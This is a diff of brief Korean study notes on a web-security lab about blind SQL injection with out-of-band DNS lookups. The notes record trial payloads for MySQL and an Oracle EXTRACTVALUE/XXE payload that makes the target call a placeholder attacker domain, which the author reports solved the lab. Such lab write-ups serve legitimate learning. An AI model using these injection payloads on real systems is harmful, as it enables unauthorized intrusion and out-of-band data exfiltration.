@@ -16,6 +16,6 @@ To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup 
  3) MySQL 인가??? >>> ' INTO OUTFILE '\\\\[내 도메인]\\a'--%20  이거 아니면 ' UNION SELECT LOADFILE('\\\\[내 도메인]\\a')--%20
   아...아니네..
  4) Oracle인가보네.. >>> TrackinId = asdawd' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding = "UTF-8"?>
-<!DOTYPE root [<!ENTITY % remote SYSTEM "http://[내 도메인]/"> %remote;]>'), '/l') FROM dual--
+<!DOTYPE root [<!ENTITY % remote SYSTEM "http://[내 도메인]/"> %remote;]>'), '/1') FROM dual--
  성공적으로 로그 찍힘. solve
 
